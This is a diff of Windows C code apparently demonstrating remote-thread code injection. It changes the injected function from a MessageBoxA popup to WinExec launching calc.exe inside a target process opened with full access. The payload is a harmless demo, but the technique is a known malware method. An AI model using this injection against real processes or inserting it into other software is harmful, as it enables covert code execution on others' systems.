@@ -6,21 +6,21 @@
 
 typedef struct _THREAD_PARAM {
     FARPROC pFunc[2];
-    char pStr[4][100];
+    char pStr[3][100];
 }THREAD_PARAM, * PTHREAD_PARAM;
 
 typedef HMODULE(WINAPI* PFLoadLibraryA)(LPCSTR lpLibFileName);
 typedef FARPROC(WINAPI* PFGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
-typedef INT(WINAPI* PFMessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
+typedef UINT(WINAPI* PFWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
 
 DWORD ThreadProc(LPVOID pParam) {
     PTHREAD_PARAM param = (PTHREAD_PARAM)pParam;
     HMODULE hMod = NULL;
-    PFMessageBoxA pFunc = NULL;
+    PFWinExec pFunc = NULL;
 
     hMod = ((PFLoadLibraryA)param->pFunc[0])(param->pStr[0]);
-    pFunc = (PFMessageBoxA)((PFGetProcAddress)param->pFunc[1])(hMod, param->pStr[1]);
-    pFunc(NULL, param->pStr[2], param->pStr[3], MB_OK); return 0;
+    pFunc = (PFWinExec)((PFGetProcAddress)param->pFunc[1])(hMod, param->pStr[1]);
+    pFunc(param->pStr[2], 0); return 0;
 }
 
 BOOL CodeInjection(DWORD dwPID) {
@@ -33,10 +33,9 @@ BOOL CodeInjection(DWORD dwPID) {
         param.pFunc[0] = GetProcAddress(hMod, "LoadLibraryA");
         param.pFunc[1] = GetProcAddress(hMod, "GetProcAddress");
 
-        strcpy_s(param.pStr[0], 100, "user32.dll");
-        strcpy_s(param.pStr[1], 100, "MessageBoxA");
-        strcpy_s(param.pStr[2], 100, "Code Injected!");
-        strcpy_s(param.pStr[3], 100, "Injection");
+        strcpy_s(param.pStr[0], 100, "kernel32.dll");
+        strcpy_s(param.pStr[1], 100, "WinExec");
+        strcpy_s(param.pStr[2], 100, "calc.exe");
 
         HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
 
